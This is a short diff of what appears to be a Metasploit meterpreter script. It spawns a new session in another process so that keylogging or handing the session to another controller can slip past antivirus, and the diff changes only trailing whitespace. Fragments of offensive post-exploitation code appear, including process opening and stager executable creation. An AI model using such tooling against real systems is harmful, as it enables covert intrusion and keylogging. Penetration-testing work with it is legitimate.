@@ -1,9 +1,9 @@
 # $Id$
 # $Revision$
 # Author: Scriptjunkie
-# Uses a meterpreter session to spawn a new meterpreter session in a different process. 
+# Uses a meterpreter session to spawn a new meterpreter session in a different process.
 # A new process allows the session to take "risky" actions that might get the process killed by
-# A/V, giving a meterpreter session to another controller, or start a keylogger on another 
+# A/V, giving a meterpreter session to another controller, or start a keylogger on another
 # process.
 #
 
@@ -83,7 +83,7 @@ if client.platform =~ /win32|win64/
 	server = client.sys.process.open
 
 	print_status("Current server process: #{server.name} (#{server.pid})")
-	
+
 	if ! inject
 		exe = ::Msf::Util::EXE.to_win32pe(client.framework, raw)
 		print_status("Meterpreter stager executable #{exe.length} bytes long")
